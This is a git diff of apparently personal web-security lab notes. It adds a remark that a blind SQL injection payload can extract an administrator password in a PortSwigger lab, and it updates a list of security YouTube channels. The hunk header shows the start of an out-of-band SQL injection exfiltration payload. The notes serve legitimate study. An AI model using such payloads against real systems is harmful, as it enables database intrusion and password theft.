@@ -1003,6 +1003,8 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
   
 [PortSwigger Lab: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)  
   
+>The SQL payload above can also be used to extract the Administrator password for the this [PortSwigger Lab: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors) challenge.  
+
 >Below SQL payload only makes call to collaboration server but no data is exfiltrated.  
 
 ```sql
@@ -1783,18 +1785,19 @@ Youtube channels:
 2. [David Bombal](https://www.youtube.com/@davidbombal/videos)  
 3. [intigriti](https://www.youtube.com/@intigriti/videos)  
 4. [Seven Seas Security](https://www.youtube.com/@7SeasSecurity/videos)  
-5. [The Cyber Mentor](https://www.youtube.com/@TCMSecurityAcademy/videos)  
-6. [Tib3rius](https://www.youtube.com/@Tib3rius/videos)  
-7. [John Hammond](https://www.youtube.com/@_JohnHammond/videos)  
-8. [TraceTheCode](https://www.youtube.com/@TraceTheCode/videos)  
-9. [Sabyasachi Paul](https://www.youtube.com/@h0tPlug1n/videos)  
-10. [bmdyy](https://www.youtube.com/@bmdyy/videos)  
-11. [securityguideme](https://www.youtube.com/@securityguideme/videos)  
-12. [nu11 security](https://www.youtube.com/@Nul1Secur1ty/videos)  
-13. [PortSwigger](https://www.youtube.com/@PortSwiggerTV/videos)  
-14. [IppSec](https://www.youtube.com/@ippsec/videos)  
-15. [TJCHacking](https://www.youtube.com/@tjchacking/videos)  
-16. [LiveUnderflow](https://www.youtube.com/@LiveUnderflow/videos)  
+5. [z3nsh3ll](https://www.youtube.com/@z3nsh3ll/videos)  
+6. [The Cyber Mentor](https://www.youtube.com/@TCMSecurityAcademy/videos)  
+7. [Tib3rius](https://www.youtube.com/@Tib3rius/videos)  
+8. [John Hammond](https://www.youtube.com/@_JohnHammond/videos)  
+9. [TraceTheCode](https://www.youtube.com/@TraceTheCode/videos)  
+10. [Sabyasachi Paul](https://www.youtube.com/@h0tPlug1n/videos)  
+11. [bmdyy](https://www.youtube.com/@bmdyy/videos)  
+12. [securityguideme](https://www.youtube.com/@securityguideme/videos)  
+13. [nu11 security](https://www.youtube.com/@Nul1Secur1ty/videos)  
+14. [PortSwigger](https://www.youtube.com/@PortSwiggerTV/videos)  
+15. [IppSec](https://www.youtube.com/@ippsec/videos)  
+16. [TJCHacking](https://www.youtube.com/@tjchacking/videos)  
+17. [LiveUnderflow](https://www.youtube.com/@LiveUnderflow/videos)  
   
 
 ## Footnote
